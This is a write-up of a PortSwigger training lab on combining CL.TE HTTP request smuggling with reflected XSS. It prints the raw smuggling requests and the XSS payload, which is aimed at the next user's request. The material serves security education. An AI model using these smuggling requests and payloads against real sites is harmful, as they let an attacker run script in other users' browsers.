# Exploiting HTTP request smuggling to deliver reflected XSS

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss), you'll learn: Exploiting HTTP request smuggling to deliver reflected XSS! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

The application is also vulnerable to [reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) via the `User-Agent` header.

To solve the lab, smuggle a request to the back-end server that causes the next user's request to receive a response containing an XSS exploit that executes `alert(1)`.

> Note: The lab simulates the activity of a victim user. Every few POST requests that you make to the lab, the victim user will make their own request. You might need to repeat your attack a few times to ensure that the victim user's request occurs as required.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-10/images/Pasted%20image%2020230201192831.png)

**In the home page, we can view other posts:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-10/images/Pasted%20image%2020230201192933.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-10/images/Pasted%20image%2020230201192950.png)

And we can leave some comments!

**View source page:**
```html
<section class="add-comment">
    <h2>Leave a comment</h2>
    <form action="/post/comment" method="POST" enctype="application/x-www-form-urlencoded">
        <input required type="hidden" name="csrf" value="2oMCDZM3owQZvSAmrw39ZmhbQ6uqVRxD">
        <input required type="hidden" name="userAgent" value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36">
        <input required type="hidden" name="postId" value="4">
        <label>Comment:</label>
        <textarea required rows="12" cols="300" name="comment"></textarea>
                <label>Name:</label>
                <input required type="text" name="name">
                <label>Email:</label>
                <input required type="email" name="email">
                <label>Website:</label>
                <input pattern="(http:|https:).+" type="text" name="website">
        <button class="button" type="submit">Post Comment</button>
    </form>
</section>
```

As you can see, there is a `userAgent` hidden `<input>` hidden element, which is very interesting.

***If we can control the `User-Agent` header, it's vulnerable to reflected XSS!***

**To do so, use Burp Suite's Repeater and modify the `User-Agent` header:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-10/images/Pasted%20image%2020230201193216.png)

In here, it's clear that we can control the `userAgent`'s value!

**Let's modify it to a XSS payload:**
```html
"><img src=errorpls onerror=alert(1)>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-10/images/Pasted%20image%2020230201193418.png)

**We can trigger it by visiting it:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-10/images/Pasted%20image%2020230201193454.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-10/images/Pasted%20image%2020230201193506.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-10/images/Pasted%20image%2020230201193520.png)

Nice! We can confirm that **the posting comment function is vulnerable to reflected XSS!**

Now, can we escalate that vulnerability much more critical?

Hmm... Let's try HTTP request smuggling.

First, we need to determind it is vulnerable to **CL.TE** (Front-end uses `Content-Length`, back-end uses `Transfer-Encoding`) or **TE.CL** (Front-end uses `Transfer-Encoding`, back-end uses `Content-Length`) HTTP request smuggling.

- CL.TE:

To test it, we first need to send an attack request, then followed by a normal request.

**Attack request:**
```http
POST / HTTP/1.1
Host: 0a840092043241a2c11b44b6007500b3.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404pls HTTP/1.1
X-Foo: x
```

This request will smuggle a 404 GET request.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-10/images/Pasted%20image%2020230201194040.png)

**Normal request:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-10/images/Pasted%20image%2020230201194049.png)

As you can see, we successfully smuggled a 404 GET request!

Hence, the web application is **vulnerable to CL.TE HTTP request smuggling.**

Now, how can we **combine reflected XSS and CL.TE HTTP request smuggling??**

**To do so, we can send the following smuggling request:**
```http
POST / HTTP/1.1
Host: 0a840092043241a2c11b44b6007500b3.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 93
Transfer-Encoding: chunked

0

GET /post?postId=4 HTTP/1.1
User-Agent: "><img src=errorpls onerror=alert(1)>
X-Foo: x
```

This request will smuggle a GET request to `/post?postId=4`, with the XSS payload in `User-Agent` header.

**By sending the attack request twice, the next user will trigger the XSS payload:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-10/images/Pasted%20image%2020230201194431.png)

# What we've learned:

1. Exploiting HTTP request smuggling to deliver reflected XSS